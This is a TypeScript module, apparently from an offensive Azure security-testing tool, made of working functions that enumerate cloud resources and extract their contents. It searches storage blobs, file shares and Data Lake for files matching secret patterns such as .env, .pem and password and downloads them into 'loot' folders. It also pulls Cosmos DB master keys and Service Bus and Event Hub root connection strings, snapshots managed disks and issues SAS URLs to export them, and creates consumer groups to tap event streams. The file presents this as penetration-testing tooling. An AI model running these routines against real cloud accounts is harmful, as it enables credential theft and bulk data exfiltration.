import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function storageDump(args: string[], timeout: number): Promise<HookResult> {
  const accountName = argVal(args, "--account-name")
  const container = argVal(args, "--container")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup"
  let regex: RegExp
  try {
    regex = new RegExp(sensitivePattern, "i")
  } catch {
    return { output: `[-] Invalid regex pattern: ${sensitivePattern}`, findings: [] }
  }

  if (accountName && container) {
    const r = await run(
      "az",
      [
        "storage",
        "blob",
        "list",
        "--account-name",
        accountName,
        "--container-name",
        container,
        "--query",
        "[].name",
        "-o",
        "json",
      ],
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot list blobs: ${r.stderr.trim()}`, findings: [] }
    const blobs = (tryJson(r.stdout) || []) as string[]
    const sensitive = blobs.filter((b) => regex.test(b))
    const output = [
      `[*] Container: ${accountName}/${container}`,
      `[+] Total blobs: ${blobs.length}`,
      `[+] Sensitive: ${sensitive.length}`,
    ]
    for (const b of sensitive) output.push(`    ${b}`)
    if (download && sensitive.length > 0) {
      for (const b of sensitive.slice(0, 10)) {
        const dl = await run(
          "az",
          [
            "storage",
            "blob",
            "download",
            "--account-name",
            accountName,
            "--container-name",
            container,
            "--name",
            b,
            "--file",
            `./blob_loot/${b.split("/").pop()}`,
            "--no-progress",
          ],
          timeout,
        )
        output.push(dl.exitCode === 0 ? `    Downloaded: ${b}` : `    Failed: ${b}`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  if (accountName) {
    const r = await run(
      "az",
      [
        "storage",
        "container",
        "list",
        "--account-name",
        accountName,
        "--query",
        "[].{name:name,access:properties.publicAccess}",
        "-o",
        "json",
      ],
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot list containers: ${r.stderr.trim()}`, findings: [] }
    const containers = tryJson(r.stdout) || []
    const output = [`[*] Storage account: ${accountName}`, `[+] Containers: ${containers.length}`]
    for (const c of containers) output.push(`    ${c.name} (access: ${c.access || "private"})`)
    return { output: output.join("\n"), findings: [] }
  }

  const accts = await run(
    "az",
    ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}", "-o", "json"],
    timeout,
  )
  if (accts.exitCode !== 0) return { output: `[-] Cannot list storage accounts: ${accts.stderr.trim()}`, findings: [] }
  const al = tryJson(accts.stdout) || []
  const output = [`[*] Found ${al.length} storage account(s)\n`]
  for (const a of al) output.push(`[+] ${a.name} (rg: ${a.rg})`)
  return { output: output.join("\n"), findings: [] }
}

export async function cosmosDump(args: string[], timeout: number): Promise<HookResult> {
  const account = argVal(args, "--account")
  const database = argVal(args, "--database")
  const container = argVal(args, "--container")
  const query = argVal(args, "--query")
  const maxItems = argVal(args, "--max-items") || "50"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Cosmos DB enumeration and extraction...\n"]

  if (!account) {
    const list = await az(
      ["cosmosdb", "list", "--query", "[].{name:name,rg:resourceGroup,kind:kind,location:location}"],
      undefined,
      timeout,
    )
    if (list.exitCode === 0) {
      const accounts = tryJson(list.stdout) || []
      output.push(`[+] Cosmos DB accounts: ${accounts.length}`)
      for (const a of accounts) output.push(`    ${a.name} (${a.kind || "SQL"}) — rg: ${a.rg}, location: ${a.location}`)
    }
    return { output: output.join("\n"), findings }
  }

  const keys = await az(["cosmosdb", "keys", "list", "--name", account, "--type", "keys"], undefined, timeout)
  if (keys.exitCode === 0) {
    const k = tryJson(keys.stdout)
    if (k) {
      output.push(`[+] Cosmos DB keys for ${account}:`)
      output.push(`    primaryMasterKey: ${String(k.primaryMasterKey || "").substring(0, 20)}...`)
      output.push(`    primaryReadonlyMasterKey: ${String(k.primaryReadonlyMasterKey || "").substring(0, 20)}...`)
      findings.push({
        checkId: "AZ-COSMOS-001",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `cosmosdb://${account}`,
        title: `Cosmos DB master keys extracted: ${account}`,
        details: "Primary and readonly master keys retrieved",
        remediation: "Rotate Cosmos DB keys after engagement",
      })
    }
  }

  const connStr = await az(
    ["cosmosdb", "keys", "list", "--name", account, "--type", "connection-strings"],
    undefined,
    timeout,
  )
  if (connStr.exitCode === 0) {
    const cs = tryJson(connStr.stdout)
    if (cs?.connectionStrings?.length) {
      output.push(`\n[+] Connection strings: ${cs.connectionStrings.length}`)
      for (const c of cs.connectionStrings)
        output.push(`    ${c.description}: ${String(c.connectionString).substring(0, 60)}...`)
    }
  }

  if (database && container && query) {
    const q = await az(
      [
        "cosmosdb",
        "sql",
        "container",
        "run-query",
        "--name",
        container,
        "--database-name",
        database,
        "--account-name",
        account,
        "--query",
        query,
        "--max-item-count",
        maxItems,
      ],
      undefined,
      timeout,
    )
    if (q.exitCode === 0) {
      output.push(`\n[+] Query results:\n${q.stdout.substring(0, 5000)}`)
      findings.push({
        checkId: "AZ-COSMOS-002",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `cosmosdb://${account}/${database}/${container}`,
        title: `Cosmos DB data extracted from ${database}/${container}`,
        details: `Query: ${query}`,
        remediation: "Review extracted data for sensitive content",
      })
    }
  }

  if (database && !container) {
    const containers = await az(
      ["cosmosdb", "sql", "container", "list", "--account-name", account, "--database-name", database],
      undefined,
      timeout,
    )
    if (containers.exitCode === 0) {
      const items = tryJson(containers.stdout) || []
      output.push(`\n[+] Containers in ${database}: ${items.length}`)
      for (const c of items) output.push(`    ${c.name || c.id}`)
    }
  }

  if (!database) {
    const dbs = await az(["cosmosdb", "sql", "database", "list", "--account-name", account], undefined, timeout)
    if (dbs.exitCode === 0) {
      const items = tryJson(dbs.stdout) || []
      output.push(`\n[+] Databases in ${account}: ${items.length}`)
      for (const d of items) output.push(`    ${d.name || d.id}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function diskSnapshot(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "list"
  const diskId = argVal(args, "--disk-id")
  const diskName = argVal(args, "--disk-name")
  const rg = argVal(args, "--resource-group")
  const snapshotName = argVal(args, "--snapshot-name")
  const shareWith = argVal(args, "--share-with")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure managed disk snapshot operations...\n"]

  if (action === "list") {
    const disks = await az(
      ["disk", "list", "--query", "[].{name:name,rg:resourceGroup,size:diskSizeGb,os:osType,state:diskState,encryption:encryption.type}"],
      sub,
      timeout,
    )
    if (disks.exitCode === 0) {
      const diskList = tryJson(disks.stdout) || []
      output.push(`[+] Managed disks: ${diskList.length}`)
      for (const d of diskList) {
        output.push(`    ${d.name} (${d.size}GB, ${d.os || "data"}) — state: ${d.state}, rg: ${d.rg}, encryption: ${d.encryption || "none"}`)
      }
    }

    const snapshots = await az(
      ["snapshot", "list", "--query", "[].{name:name,rg:resourceGroup,size:diskSizeGb,source:creationData.sourceResourceId}"],
      sub,
      timeout,
    )
    if (snapshots.exitCode === 0) {
      const snapList = tryJson(snapshots.stdout) || []
      output.push(`\n[+] Existing snapshots: ${snapList.length}`)
      for (const s of snapList) output.push(`    ${s.name} (${s.size}GB) — source: ${s.source?.split("/").pop() || "unknown"}, rg: ${s.rg}`)
    }
  }

  if (action === "create" && (diskId || (diskName && rg))) {
    const name = snapshotName || `cs-snap-${diskName || "disk"}`
    const sourceArgs = diskId ? ["--source", diskId] : ["--source", diskName!, "--resource-group", rg!]
    const create = await az(
      ["snapshot", "create", "--name", name, ...sourceArgs, "--tags", "cyberstrike=true"],
      sub,
      timeout,
    )
    if (create.exitCode === 0) {
      const snap = tryJson(create.stdout)
      output.push(`[+] Snapshot created: ${name}`)
      output.push(`    Size: ${snap?.diskSizeGb || "unknown"}GB`)
      output.push(`    Source: ${diskName || diskId}`)
      findings.push({
        checkId: "AZ-DISK-001",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `snapshot://${name}`,
        title: `Disk snapshot created: ${name}`,
        details: `Full disk copy of ${diskName || diskId} — may contain credentials, keys, databases`,
        remediation: `Delete snapshot: az snapshot delete --name ${name}`,
      })
    } else {
      output.push(`[-] Snapshot creation failed: ${create.stderr.slice(0, 200)}`)
    }
  }

  if (action === "export" && snapshotName && rg) {
    const grant = await az(
      ["snapshot", "grant-access", "--name", snapshotName, "--resource-group", rg, "--duration-in-seconds", "3600", "--access-level", "Read"],
      sub,
      timeout,
    )
    if (grant.exitCode === 0) {
      const access = tryJson(grant.stdout)
      const sasUrl = access?.accessSAS || ""
      output.push(`[+] SAS URL generated for snapshot ${snapshotName}:`)
      output.push(`    ${sasUrl.substring(0, 100)}...`)
      output.push(`    Valid for 1 hour — download with: azcopy copy "${sasUrl}" ./snapshot.vhd`)
      findings.push({
        checkId: "AZ-DISK-002",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `snapshot://${snapshotName}`,
        title: `Snapshot SAS URL generated: ${snapshotName}`,
        details: "Snapshot can be downloaded for offline analysis",
        remediation: `Revoke access: az snapshot revoke-access --name ${snapshotName} --resource-group ${rg}`,
      })
    }
  }

  if (action === "share" && snapshotName && shareWith) {
    output.push(`\n[!] Cross-subscription sharing steps:`)
    output.push(`    1. Grant access: az snapshot grant-access --name ${snapshotName} --duration-in-seconds 3600`)
    output.push(`    2. Copy to target subscription: az snapshot create --source <SAS_URL> --subscription ${shareWith}`)
  }

  return { output: output.join("\n"), findings }
}

export async function tableQueueDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const accountName = argVal(args, "--account-name")
  const accountKey = argVal(args, "--account-key")
  const tableName = argVal(args, "--table")
  const queueName = argVal(args, "--queue")
  const maxItems = argVal(args, "--max-items") || "50"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Table Storage & Queue extraction...\n"]

  if (!accountName) {
    const accts = await az(
      ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup,kind:kind}"],
      sub,
      timeout,
    )
    if (accts.exitCode === 0) {
      const list = tryJson(accts.stdout) || []
      output.push(`[+] Storage accounts: ${list.length}`)
      for (const a of list) output.push(`    ${a.name} (${a.kind}) — rg: ${a.rg}`)
      output.push(`\n[*] Use --account-name NAME [--account-key KEY] to enumerate tables/queues`)
    }
    return { output: output.join("\n"), findings }
  }

  const keyArgs = accountKey ? ["--account-key", accountKey] : []

  const tables = await run(
    "az",
    ["storage", "table", "list", "--account-name", accountName, ...keyArgs, "-o", "json"],
    timeout,
  )
  if (tables.exitCode === 0) {
    const tableList = tryJson(tables.stdout) || []
    output.push(`[+] Tables in ${accountName}: ${tableList.length}`)
    for (const t of tableList) {
      const name = typeof t === "string" ? t : t.name || t
      output.push(`    ${name}`)
    }

    if (tableName) {
      const query = await run(
        "az",
        ["storage", "entity", "query", "--table-name", tableName, "--account-name", accountName, ...keyArgs, "--top", maxItems, "-o", "json"],
        timeout,
      )
      if (query.exitCode === 0) {
        const entities = tryJson(query.stdout)?.items || tryJson(query.stdout) || []
        output.push(`\n[+] Entities in ${tableName}: ${entities.length} (showing up to ${maxItems})`)
        const sample = JSON.stringify(entities.slice(0, 3), null, 2).substring(0, 2000)
        output.push(sample)
        findings.push({
          checkId: "AZ-TABLE-001",
          provider: "azure",
          severity: "high",
          status: "EXTRACTED",
          resource: `table://${accountName}/${tableName}`,
          title: `Table data extracted: ${accountName}/${tableName}`,
          details: `${entities.length} entities retrieved`,
          remediation: "Review extracted data for sensitive content",
        })
      }
    }
  }

  const queues = await run(
    "az",
    ["storage", "queue", "list", "--account-name", accountName, ...keyArgs, "-o", "json"],
    timeout,
  )
  if (queues.exitCode === 0) {
    const queueList = tryJson(queues.stdout) || []
    output.push(`\n[+] Queues in ${accountName}: ${queueList.length}`)
    for (const q of queueList) {
      const name = typeof q === "string" ? q : q.name || q
      output.push(`    ${name}`)
    }

    if (queueName) {
      const peek = await run(
        "az",
        ["storage", "message", "peek", "--queue-name", queueName, "--account-name", accountName, ...keyArgs, "--num-messages", "10", "-o", "json"],
        timeout,
      )
      if (peek.exitCode === 0) {
        const messages = tryJson(peek.stdout) || []
        output.push(`\n[+] Messages in ${queueName}: ${messages.length} (peeked, not dequeued)`)
        for (const m of messages) {
          const content = m.content || m.messageText || ""
          output.push(`    [${m.insertionTime || ""}] ${String(content).substring(0, 200)}`)
        }
        if (messages.length > 0) {
          findings.push({
            checkId: "AZ-QUEUE-001",
            provider: "azure",
            severity: "high",
            status: "EXTRACTED",
            resource: `queue://${accountName}/${queueName}`,
            title: `Queue messages peeked: ${accountName}/${queueName}`,
            details: `${messages.length} messages read without consuming`,
            remediation: "Review messages for sensitive data",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function fileShareDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const accountName = argVal(args, "--account-name")
  const accountKey = argVal(args, "--account-key")
  const shareName = argVal(args, "--share-name")
  const dir = argVal(args, "--directory") || ""
  const download = hasFlag(args, "--download")
  const pattern = argVal(args, "--pattern") || "\\.(env|pem|key|p12|pfx|conf|config|json|xml|sql|bak|ps1|sh)$|password|secret|credential"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure File Share enumeration...\n"]

  let regex: RegExp
  try {
    regex = new RegExp(pattern, "i")
  } catch {
    return { output: `[-] Invalid regex pattern: ${pattern}`, findings }
  }

  if (!accountName) {
    const accts = await az(
      ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}"],
      sub,
      timeout,
    )
    if (accts.exitCode === 0) {
      const list = tryJson(accts.stdout) || []
      output.push(`[+] Storage accounts: ${list.length}`)
      for (const a of list) output.push(`    ${a.name} — rg: ${a.rg}`)
      output.push(`\n[*] Use --account-name NAME [--account-key KEY] to list shares`)
    }
    return { output: output.join("\n"), findings }
  }

  const keyArgs = accountKey ? ["--account-key", accountKey] : []

  const shares = await run(
    "az",
    ["storage", "share", "list", "--account-name", accountName, ...keyArgs, "-o", "json"],
    timeout,
  )
  if (shares.exitCode !== 0) return { output: `[-] Cannot list shares: ${shares.stderr.trim()}`, findings }

  const shareList = tryJson(shares.stdout) || []
  output.push(`[+] File shares in ${accountName}: ${shareList.length}`)
  for (const s of shareList) {
    output.push(`    ${s.name} (quota: ${s.properties?.quota || "unknown"}GB)`)
  }

  const targetShare = shareName || (shareList.length === 1 ? shareList[0].name : null)
  if (!targetShare) {
    output.push(`\n[*] Use --share-name NAME to list files in a specific share`)
    return { output: output.join("\n"), findings }
  }

  const dirArgs = dir ? ["--path", dir] : []
  const files = await run(
    "az",
    ["storage", "file", "list", "--share-name", targetShare, "--account-name", accountName, ...keyArgs, ...dirArgs, "-o", "json"],
    timeout,
  )
  if (files.exitCode === 0) {
    const fileList = tryJson(files.stdout) || []
    output.push(`\n[+] Files in ${targetShare}/${dir || "root"}: ${fileList.length}`)
    const sensitive: string[] = []
    for (const f of fileList) {
      const name = f.name || ""
      const type = f.type === "dir" ? "[DIR]" : `[${f.properties?.contentLength || 0}B]`
      output.push(`    ${type} ${name}`)
      if (f.type !== "dir" && regex.test(name)) sensitive.push(name)
    }

    if (sensitive.length > 0) {
      output.push(`\n[!] Sensitive files found: ${sensitive.length}`)
      for (const s of sensitive) output.push(`    → ${s}`)
      findings.push({
        checkId: "AZ-FILESHARE-001",
        provider: "azure",
        severity: "high",
        status: "FOUND",
        resource: `fileshare://${accountName}/${targetShare}`,
        title: `${sensitive.length} sensitive file(s) in file share`,
        details: `Files matching pattern: ${sensitive.join(", ")}`,
        remediation: "Review and restrict file share access",
      })

      if (download) {
        for (const s of sensitive.slice(0, 5)) {
          const dl = await run(
            "az",
            ["storage", "file", "download", "--share-name", targetShare, "--path", s, "--dest", `./fileshare_loot/${s}`, "--account-name", accountName, ...keyArgs, "--no-progress"],
            timeout,
          )
          output.push(dl.exitCode === 0 ? `    Downloaded: ${s}` : `    Failed: ${s}`)
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dataLakeDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const accountName = argVal(args, "--account-name")
  const fsName = argVal(args, "--filesystem")
  const dir = argVal(args, "--directory") || "/"
  const download = hasFlag(args, "--download")
  const pattern = argVal(args, "--pattern") || "\\.(csv|parquet|json|avro|sql|bak)$|pii|sensitive|credential|secret"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Data Lake Storage Gen2 enumeration...\n"]

  let regex: RegExp
  try {
    regex = new RegExp(pattern, "i")
  } catch {
    return { output: `[-] Invalid regex pattern: ${pattern}`, findings }
  }

  if (!accountName) {
    const accts = await az(
      ["storage", "account", "list", "--query", "[?kind=='StorageV2' || kind=='BlobStorage'].{name:name,rg:resourceGroup,hns:isHnsEnabled}"],
      sub,
      timeout,
    )
    if (accts.exitCode === 0) {
      const list = tryJson(accts.stdout) || []
      const dlAccounts = list.filter((a: Record<string, unknown>) => a.hns === true)
      output.push(`[+] Data Lake (HNS-enabled) accounts: ${dlAccounts.length}`)
      for (const a of dlAccounts) output.push(`    ${a.name} — rg: ${a.rg}`)
      if (dlAccounts.length === 0) output.push(`    (none — HNS not enabled on any storage account)`)
    }
    return { output: output.join("\n"), findings }
  }

  const filesystems = await run(
    "az",
    ["storage", "fs", "list", "--account-name", accountName, "-o", "json"],
    timeout,
  )
  if (filesystems.exitCode !== 0) return { output: `[-] Cannot list filesystems: ${filesystems.stderr.trim()}`, findings }
  const fsList = tryJson(filesystems.stdout) || []
  output.push(`[+] Filesystems in ${accountName}: ${fsList.length}`)
  for (const fs of fsList) output.push(`    ${fs.name}`)

  const targetFs = fsName || (fsList.length === 1 ? fsList[0].name : null)
  if (!targetFs) {
    output.push(`\n[*] Use --filesystem NAME to browse files`)
    return { output: output.join("\n"), findings }
  }

  const dirList = await run(
    "az",
    ["storage", "fs", "file", "list", "--file-system", targetFs, "--account-name", accountName, "--path", dir, "-o", "json"],
    timeout,
  )
  if (dirList.exitCode === 0) {
    const items = tryJson(dirList.stdout) || []
    output.push(`\n[+] Files in ${targetFs}${dir}: ${items.length}`)
    const sensitive: string[] = []
    for (const item of items.slice(0, 50)) {
      const name = item.name || ""
      const size = item.contentLength || 0
      const isDir = item.isDirectory === true
      output.push(`    ${isDir ? "[DIR]" : `[${size}B]`} ${name}`)
      if (!isDir && regex.test(name)) sensitive.push(name)
    }
    if (items.length > 50) output.push(`    ... and ${items.length - 50} more`)

    if (sensitive.length > 0) {
      output.push(`\n[!] Sensitive files: ${sensitive.length}`)
      for (const s of sensitive) output.push(`    → ${s}`)
      findings.push({
        checkId: "AZ-DATALAKE-001",
        provider: "azure",
        severity: "high",
        status: "FOUND",
        resource: `datalake://${accountName}/${targetFs}`,
        title: `${sensitive.length} sensitive file(s) in Data Lake`,
        details: `Pattern: ${sensitive.join(", ")}`,
        remediation: "Review Data Lake ACLs and access policies",
      })

      if (download) {
        for (const s of sensitive.slice(0, 5)) {
          const dl = await run(
            "az",
            ["storage", "fs", "file", "download", "--file-system", targetFs, "--path", s, "--destination", `./datalake_loot/${s.split("/").pop()}`, "--account-name", accountName, "--overwrite"],
            timeout,
          )
          output.push(dl.exitCode === 0 ? `    Downloaded: ${s}` : `    Failed: ${s}`)
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function serviceBusSniff(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const namespace = argVal(args, "--namespace")
  const queueName = argVal(args, "--queue")
  const topicName = argVal(args, "--topic")
  const rg = argVal(args, "--resource-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Service Bus enumeration...\n"]

  if (!namespace) {
    const namespaces = await az(
      ["servicebus", "namespace", "list", "--query", "[].{name:name,rg:resourceGroup,sku:sku.name,location:location}"],
      sub,
      timeout,
    )
    if (namespaces.exitCode !== 0) return { output: "[-] Cannot list Service Bus namespaces", findings }
    const nsList = tryJson(namespaces.stdout) || []
    output.push(`[+] Service Bus namespaces: ${nsList.length}`)
    for (const ns of nsList) output.push(`    ${ns.name} (${ns.sku}) — rg: ${ns.rg}, location: ${ns.location}`)
    if (nsList.length > 0) output.push(`\n[*] Use --namespace NAME --resource-group RG to enumerate queues/topics`)
    return { output: output.join("\n"), findings }
  }

  if (!rg) return { output: "[-] --resource-group required with --namespace", findings }

  const queues = await az(
    ["servicebus", "queue", "list", "--namespace-name", namespace, "--resource-group", rg],
    sub,
    timeout,
  )
  if (queues.exitCode === 0) {
    const queueList = tryJson(queues.stdout) || []
    output.push(`[+] Queues in ${namespace}: ${queueList.length}`)
    for (const q of queueList) {
      output.push(`    ${q.name} — active: ${q.countDetails?.activeMessageCount || 0}, dead: ${q.countDetails?.deadLetterMessageCount || 0}`)
    }
  }

  const topics = await az(
    ["servicebus", "topic", "list", "--namespace-name", namespace, "--resource-group", rg],
    sub,
    timeout,
  )
  if (topics.exitCode === 0) {
    const topicList = tryJson(topics.stdout) || []
    output.push(`\n[+] Topics in ${namespace}: ${topicList.length}`)
    for (const t of topicList) output.push(`    ${t.name} — subscriptions: ${t.subscriptionCount || 0}`)
  }

  const keys = await az(
    ["servicebus", "namespace", "authorization-rule", "keys", "list", "--namespace-name", namespace, "--resource-group", rg, "--name", "RootManageSharedAccessKey"],
    sub,
    timeout,
  )
  if (keys.exitCode === 0) {
    const k = tryJson(keys.stdout)
    if (k) {
      output.push(`\n[+] Connection strings:`)
      output.push(`    Primary: ${String(k.primaryConnectionString || "").substring(0, 80)}...`)
      findings.push({
        checkId: "AZ-SBUS-001",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `servicebus://${namespace}`,
        title: `Service Bus connection string extracted: ${namespace}`,
        details: "RootManageSharedAccessKey provides full access to all queues and topics",
        remediation: "Rotate Service Bus keys after engagement",
      })
    }
  }

  if (queueName) {
    const peek = await az(
      ["servicebus", "queue", "message", "peek", "--queue-name", queueName, "--namespace-name", namespace, "--resource-group", rg, "--max-count", "10"],
      sub,
      timeout,
    )
    if (peek.exitCode === 0) {
      const messages = tryJson(peek.stdout) || []
      output.push(`\n[+] Peeked messages from ${queueName}: ${messages.length}`)
      for (const m of messages) {
        const body = m.body || m.messageBody || ""
        output.push(`    [${m.enqueuedTimeUtc || ""}] ${String(body).substring(0, 200)}`)
      }
      if (messages.length > 0) {
        findings.push({
          checkId: "AZ-SBUS-002",
          provider: "azure",
          severity: "high",
          status: "EXTRACTED",
          resource: `servicebus://${namespace}/${queueName}`,
          title: `Service Bus messages peeked: ${queueName}`,
          details: `${messages.length} messages read without consuming`,
          remediation: "Review messages for sensitive data in transit",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function eventHubTap(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const namespace = argVal(args, "--namespace")
  const hubName = argVal(args, "--hub")
  const rg = argVal(args, "--resource-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Event Hub enumeration...\n"]

  if (!namespace) {
    const namespaces = await az(
      ["eventhubs", "namespace", "list", "--query", "[].{name:name,rg:resourceGroup,sku:sku.name,location:location}"],
      sub,
      timeout,
    )
    if (namespaces.exitCode !== 0) return { output: "[-] Cannot list Event Hub namespaces", findings }
    const nsList = tryJson(namespaces.stdout) || []
    output.push(`[+] Event Hub namespaces: ${nsList.length}`)
    for (const ns of nsList) output.push(`    ${ns.name} (${ns.sku}) — rg: ${ns.rg}, location: ${ns.location}`)
    if (nsList.length > 0) output.push(`\n[*] Use --namespace NAME --resource-group RG to enumerate hubs`)
    return { output: output.join("\n"), findings }
  }

  if (!rg) return { output: "[-] --resource-group required with --namespace", findings }

  const hubs = await az(
    ["eventhubs", "eventhub", "list", "--namespace-name", namespace, "--resource-group", rg],
    sub,
    timeout,
  )
  if (hubs.exitCode === 0) {
    const hubList = tryJson(hubs.stdout) || []
    output.push(`[+] Event Hubs in ${namespace}: ${hubList.length}`)
    for (const h of hubList) {
      output.push(`    ${h.name} — partitions: ${h.partitionCount || 0}, retention: ${h.messageRetentionInDays || 0}d`)

      const cgs = await az(
        ["eventhubs", "eventhub", "consumer-group", "list", "--eventhub-name", h.name, "--namespace-name", namespace, "--resource-group", rg],
        sub,
        timeout,
      )
      if (cgs.exitCode === 0) {
        const cgList = tryJson(cgs.stdout) || []
        for (const cg of cgList) output.push(`      consumer-group: ${cg.name}`)
      }
    }
  }

  const keys = await az(
    ["eventhubs", "namespace", "authorization-rule", "keys", "list", "--namespace-name", namespace, "--resource-group", rg, "--name", "RootManageSharedAccessKey"],
    sub,
    timeout,
  )
  if (keys.exitCode === 0) {
    const k = tryJson(keys.stdout)
    if (k) {
      output.push(`\n[+] Connection strings:`)
      output.push(`    Primary: ${String(k.primaryConnectionString || "").substring(0, 80)}...`)
      findings.push({
        checkId: "AZ-EHUB-001",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `eventhub://${namespace}`,
        title: `Event Hub connection string extracted: ${namespace}`,
        details: "RootManageSharedAccessKey provides full access to all hubs",
        remediation: "Rotate Event Hub keys after engagement",
      })
    }
  }

  if (hubName) {
    const cgName = `cs-tap-${hubName}`
    const createCg = await az(
      ["eventhubs", "eventhub", "consumer-group", "create", "--eventhub-name", hubName, "--namespace-name", namespace, "--resource-group", rg, "--name", cgName],
      sub,
      timeout,
    )
    if (createCg.exitCode === 0) {
      output.push(`\n[+] Consumer group created: ${cgName} on ${hubName}`)
      output.push(`    Use Event Hub SDK or Azure Functions to consume events via this group`)
      findings.push({
        checkId: "AZ-EHUB-002",
        provider: "azure",
        severity: "high",
        status: "EXPLOITED",
        resource: `eventhub://${namespace}/${hubName}/${cgName}`,
        title: `Event Hub consumer group created: ${cgName}`,
        details: "Can capture real-time event streams from this hub",
        remediation: `Delete consumer group: az eventhubs eventhub consumer-group delete --name ${cgName} --eventhub-name ${hubName} --namespace-name ${namespace} --resource-group ${rg}`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}
